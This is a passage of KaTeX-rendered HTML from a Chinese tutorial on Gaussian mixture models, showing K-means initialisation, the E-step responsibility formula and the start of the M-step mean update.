class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1302em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>，其权重为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>。<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{x}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span>则表示数据集中的第<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>个样本，形状为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(n,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>。</p>
<p><strong>1. 参数初始化</strong></p>
<p>首先需要初始化 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 个高斯分布的参数：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi>π</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_{j},\boldsymbol{\mu}_{j},\pi_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0636em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 。<strong>完全随机初始化</strong>虽然理论上可行，但实践中容易导致收敛缓慢或陷入较差的局部最优。因此，通常采用<strong>K-means聚类</strong>的结果进行初始化：</p>
<ul>
<li>用K-means将数据划分为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 个簇</li>
<li>以每个簇的样本均值作为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span></span></span></span></span> 的初始值</li>
<li>以每个簇的样本协方差作为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\Sigma_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 的初始值</li>
<li>以每个簇的样本比例作为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\pi_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 的初始值</li>
</ul>
<p><strong>2. E步：计算隶属度</strong></p>
<p>然后求出每一个样本 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">\mathbf{x}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"/><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span> 对应的每一个高斯分布 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 的隶属度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow><annotation encoding="application/x-tex">\gamma_{j}^{(i)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4578em;vertical-align:-0.413em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span></span></span>（标量），即第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个数据属于第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 个高斯分布的程度，计算方式如下</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><mo>=</mo><mfrac><mrow><msub><mi>π</mi><mi>j</mi></msub><mtext> </mtext><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>∣</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>∑</mo><mrow><mi>l</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup></mstyle><msub><mi>π</mi><mi>l</mi></msub><mtext> </mtext><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>∣</mo><msub><mi mathvariant="bold-italic">μ</mi><mi>l</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mi>l</mi></msub><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\gamma_{j}^{(i)} = \frac{\pi_{j} \space \mathcal{N}(\mathbf{x}^{(i)}\mid \boldsymbol{\mu}_{j},\Sigma_{j})}{ {\textstyle \sum_{l=1}^{k}} \pi_{l} \space \mathcal{N}(\mathbf{x}^{(i)}\mid \boldsymbol{\mu}_{l},\Sigma_{l})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4578em;vertical-align:-0.413em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.837em;vertical-align:-1.1787em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6582em;"><span style="top:-2.121em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace"> </span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.814em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.242em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.7702em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace"> </span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1787em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p><strong>3. M步：更新参数</strong></p>
<p>基于E步计算出的责任，我们更新每个高斯成分的参数</p>
<ul>
<li><strong>更新均值</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span></span></span></span></span>（向量）：</li>
</ul>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold-italic">μ</mi><mi>j</mi></msub><mo>=</mo><mfrac><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup><msup><mi mathvariant="bold">x</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup></mrow><mrow><mstyle scriptlevel="0" displaystyle="false"><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup></mstyle><msubsup><mi>γ</mi><mi>j</mi><mrow><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msubsup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}_{j} = \frac{{\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}\mathbf{x}^{(i)}}{ {\textstyle \sum_{i=1}^{m}} \gamma_{j}^{(i)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8247em;vertical-align:-0.3802em;"/><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3802em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.1955em;vertical-align:-1.3478em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8478em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span></span></span><span style="top:-3.2748em;"><span class="pstrut" style="height:3.0448em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.8478em;"><span class="pstrut" style="height:3.0448em;"/><span class="mord"><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0448em;"><span style="top:-2.4231em;margin-left:-0.0556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.2198em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.413em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathbf">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord 